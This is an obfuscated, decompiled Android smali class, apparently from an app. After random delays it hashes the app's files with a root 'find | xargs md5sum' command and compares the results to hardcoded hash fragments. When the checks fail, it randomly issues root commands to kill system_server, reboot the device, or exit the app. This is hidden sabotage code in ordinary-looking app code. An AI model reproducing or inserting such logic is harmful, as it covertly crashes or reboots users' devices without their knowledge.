.class public final Lၛ/Ԩ;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 13

    .line 1
    const/4 v0, 0x6

    .line 2
    :try_start_0
    new-instance v1, Ljava/util/Random;

    .line 3
    .line 4
    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    .line 5
    .line 6
    .line 7
    invoke-virtual {v1, v0}, Ljava/util/Random;->nextInt(I)I

    .line 8
    .line 9
    .line 10
    move-result v1

    .line 11
    add-int/lit8 v1, v1, 0x2

    .line 12
    .line 13
    mul-int/lit16 v1, v1, 0x3e8

    .line 14
    .line 15
    int-to-long v1, v1

    .line 16
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 17
    .line 18
    .line 19
    goto :goto_0

    .line 20
    :catch_0
    nop

    .line 21
    :goto_0
    const-string v3, "E9E1300F14"

    .line 22
    .line 23
    const-string v4, "BD9520759"

    .line 24
    .line 25
    const-string v5, "F32D2772"

    .line 26
    .line 27
    const-string v6, "54DC9F92"

    .line 28
    .line 29
    const-string v7, "069493028"

    .line 30
    .line 31
    const-string v8, "14F1053"

    .line 32
    .line 33
    const-string v9, "3028C97"

    .line 34
    .line 35
    const-string v10, "3069493"

    .line 36
    .line 37
    const-string v11, "F9AED43"

    .line 38
    .line 39
    filled-new-array/range {v3 .. v11}, [Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    move-result-object v1

    .line 43
    new-instance v2, Ljava/lang/StringBuffer;

    .line 44
    .line 45
    const-string v3, "KILLALL SYSTEM_SERVER"

    .line 46
    .line 47
    invoke-direct {v2, v3}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 48
    .line 49
    .line 50
    new-instance v4, Ljava/lang/StringBuffer;

    .line 51
    .line 52
    const-string v5, "REBOOT"

    .line 53
    .line 54
    invoke-direct {v4, v5}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 55
    .line 56
    .line 57
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 58
    .line 59
    .line 60
    move-result-object v3

    .line 61
    invoke-static {v3}, Lၛ/Ԫ;->Ϳ(Ljava/lang/String;)Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object v3

    .line 65
    const-string v5, "FIND"

    .line 66
    .line 67
    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 68
    .line 69
    .line 70
    move-result-object v5

    .line 71
    invoke-static {v5}, Lၛ/Ԫ;->Ϳ(Ljava/lang/String;)Ljava/lang/String;

    .line 72
    .line 73
    .line 74
    move-result-object v5

    .line 75
    const-string v6, "XARGS"

    .line 76
    .line 77
    invoke-virtual {v6}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 78
    .line 79
    .line 80
    move-result-object v6

    .line 81
    invoke-static {v6}, Lၛ/Ԫ;->Ϳ(Ljava/lang/String;)Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object v6

    .line 85
    new-instance v7, Ljava/lang/StringBuilder;

    .line 86
    .line 87
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 88
    .line 89
    .line 90
    const-string v8, "MD"

    .line 91
    .line 92
    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 93
    .line 94
    .line 95
    move-result-object v8

    .line 96
    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 97
    .line 98
    .line 99
    const/4 v8, 0x5

    .line 100
    const/16 v9, 0x9

    .line 101
    .line 102
    invoke-static {v8, v9}, Ljava/lang/Math;->min(II)I

    .line 103
    .line 104
    .line 105
    move-result v8

    .line 106
    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 107
    .line 108
    .line 109
    const-string v8, "SU"

    .line 110
    .line 111
    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 112
    .line 113
    .line 114
    move-result-object v10

    .line 115
    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 116
    .line 117
    .line 118
    const-string v10, "M"

    .line 119
    .line 120
    invoke-virtual {v10}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    move-result-object v10

    .line 124
    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 125
    .line 126
    .line 127
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v7

    .line 131
    invoke-static {v7}, Lၛ/Ԫ;->Ϳ(Ljava/lang/String;)Ljava/lang/String;

    .line 132
    .line 133
    .line 134
    move-result-object v7

    .line 135
    const-string v10, " "

    .line 136
    .line 137
    invoke-static {v5, v10}, Landroid/support/v4/media/Ϳ;->ԯ(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 138
    .line 139
    .line 140
    move-result-object v5

    .line 141
    invoke-static {}, Landroidx/lifecycle/ދ;->ؠ()Landroid/content/Context;

    .line 142
    .line 143
    .line 144
    move-result-object v11

    .line 145
    invoke-virtual {v11}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    .line 146
    .line 147
    .line 148
    move-result-object v11

    .line 149
    invoke-virtual {v11}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    move-result-object v11

    .line 153
    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 154
    .line 155
    .line 156
    const-string v11, " -type f -print0 |"

    .line 157
    .line 158
    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 159
    .line 160
    .line 161
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 162
    .line 163
    .line 164
    const-string v6, " -0 "

    .line 165
    .line 166
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 167
    .line 168
    .line 169
    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 170
    .line 171
    .line 172
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 173
    .line 174
    .line 175
    move-result-object v5

    .line 176
    const/4 v6, 0x1

    .line 177
    new-array v7, v6, [Ljava/lang/String;

    .line 178
    .line 179
    const/4 v11, 0x0

    .line 180
    aput-object v5, v7, v11

    .line 181
    .line 182
    invoke-static {v7, v11, v6}, Lˉ/ޔ;->Ԩ([Ljava/lang/String;ZZ)Lˉ/ޔ$Ϳ;

    .line 183
    .line 184
    .line 185
    move-result-object v5

    .line 186
    iget v7, v5, Lˉ/ޔ$Ϳ;->Ϳ:I

    .line 187
    .line 188
    if-eqz v7, :cond_0

    .line 189
    .line 190
    new-instance v7, Ljava/lang/StringBuilder;

    .line 191
    .line 192
    const-string v12, ""

    .line 193
    .line 194
    invoke-direct {v7, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 195
    .line 196
    .line 197
    iget-object v12, v5, Lˉ/ޔ$Ϳ;->ԩ:Ljava/lang/String;

    .line 198
    .line 199
    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 200
    .line 201
    .line 202
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 203
    .line 204
    .line 205
    move-result-object v7

    .line 206
    invoke-static {v8, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 207
    .line 208
    .line 209
    :cond_0
    :try_start_1
    new-instance v7, Ljava/util/Random;

    .line 210
    .line 211
    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    .line 212
    .line 213
    .line 214
    const/16 v8, 0x8

    .line 215
    .line 216
    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    .line 217
    .line 218
    .line 219
    move-result v7

    .line 220
    add-int/2addr v7, v0

    .line 221
    mul-int/lit16 v7, v7, 0x3e8

    .line 222
    .line 223
    int-to-long v7, v7

    .line 224
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 225
    .line 226
    .line 227
    :catch_1
    const/4 v0, 0x0

    .line 228
    :goto_1
    if-ge v0, v9, :cond_4

    .line 229
    .line 230
    aget-object v7, v1, v0

    .line 231
    .line 232
    iget-object v8, v5, Lˉ/ޔ$Ϳ;->Ԩ:Ljava/lang/String;

    .line 233
    .line 234
    if-eqz v8, :cond_1

    .line 235
    .line 236
    invoke-virtual {v7}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 237
    .line 238
    .line 239
    move-result-object v7

    .line 240
    invoke-virtual {v8, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 241
    .line 242
    .line 243
    move-result v7

    .line 244
    if-eqz v7, :cond_1

    .line 245
    .line 246
    goto :goto_3

    .line 247
    :cond_1
    new-instance v7, Ljava/util/Random;

    .line 248
    .line 249
    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    .line 250
    .line 251
    .line 252
    const/16 v8, 0xa

    .line 253
    .line 254
    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    .line 255
    .line 256
    .line 257
    move-result v7

    .line 258
    const/4 v12, 0x3

    .line 259
    if-le v7, v12, :cond_2

    .line 260
    .line 261
    move-object v7, v3

    .line 262
    goto :goto_2

    .line 263
    :cond_2
    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    .line 264
    .line 265
    .line 266
    move-result-object v7

    .line 267
    invoke-virtual {v7}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    .line 268
    .line 269
    .line 270
    move-result-object v7

    .line 271
    :goto_2
    new-array v12, v6, [Ljava/lang/String;

    .line 272
    .line 273
    aput-object v7, v12, v11

    .line 274
    .line 275
    invoke-static {v6, v12}, Lˉ/ޔ;->Ϳ(Z[Ljava/lang/String;)Lˉ/ޔ$Ϳ;

    .line 276
    .line 277
    .line 278
    :try_start_2
    new-instance v7, Ljava/util/Random;

    .line 279
    .line 280
    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    .line 281
    .line 282
    .line 283
    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    .line 284
    .line 285
    .line 286
    move-result v7

    .line 287
    const/4 v8, 0x7

    .line 288
    if-le v7, v8, :cond_3

    .line 289
    .line 290
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 291
    .line 292
    .line 293
    move-result-object v7

    .line 294
    invoke-virtual {v7, v11}, Ljava/lang/Runtime;->exit(I)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 295
    .line 296
    .line 297
    :catchall_0
    :cond_3
    :goto_3
    add-int/lit8 v0, v0, 0x1

    .line 298
    .line 299
    goto :goto_1

    .line 300
    :cond_4
    invoke-virtual {v2, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 301
    .line 302
    .line 303
    return-void
.end method
